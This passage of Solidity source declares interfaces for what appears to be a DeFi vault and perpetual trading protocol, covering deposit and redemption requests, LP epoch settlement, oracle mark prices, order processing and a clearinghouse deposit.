    function assignUnassignedAssets(bool toSenior, address receiver) external;
    function settleLpEpoch(uint256 expectedMarkPrice, uint256 expectedPublishTime) external;
    function lpEpochStart(uint256 epochId) external pure returns (uint256);

}

interface IVault {

    function quoteBootstrapDeposit(uint256 assets) external view returns (uint256);
    function requestDeposit(uint256 assets, address controller, address owner) external returns (uint256 requestId);
    function claimableDepositRequest(uint256 requestId, address controller) external view returns (uint256);
    function claimDeposit(uint256 requestId, uint256 assets, address receiver, address controller)
        external
        returns (uint256 shares);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function lastDepositTime(address account) external view returns (uint256);
    function DEPOSIT_COOLDOWN() external view returns (uint256);
    function maxRequestRedeem(address account) external view returns (uint256);
    function requestRedeem(uint256 shares, address controller, address owner) external returns (uint256 requestId);
    function claimableRedeemRequest(uint256 requestId, address controller) external view returns (uint256);
    function claimRedeem(uint256 requestId, uint256 shares, address receiver, address controller)
        external
        returns (uint256 assets);

}

interface IEngine {

    struct Order {
        address account;
        uint256 sizeDelta;
        uint256 marginDelta;
        uint256 targetPrice;
        uint64 commitTime;
        uint64 commitBlock;
        uint64 orderId;
        uint8 side;
        bool isClose;
    }

    function owner() external view returns (address);
    function orderRouter() external view returns (address);
    function lastMarkPrice() external view returns (uint256);
    function lastMarkTime() external view returns (uint64);
    function isOracleFrozen() external view returns (bool);
    function recapitalizePool(uint256 amountAssets) external;
    function updateMarkPrice(uint256 price, uint64 publishTime) external;
    function processOrderTyped(Order calldata order, uint256 currentOraclePrice, uint256 poolDepthAssets, uint64 publishTime)
        external;
    function positions(address account)
        external
        view
        returns (
            uint256 size,
            uint256 margin,
            uint256 entryPrice,
            uint256 maxProfitAssets,
            uint8 side,
            uint64 lastUpdateTime,
            int256 vpiAccrued
        );

}

interface IClearinghouse {

    function deposit(address account, uint256 amount) external;

}
```

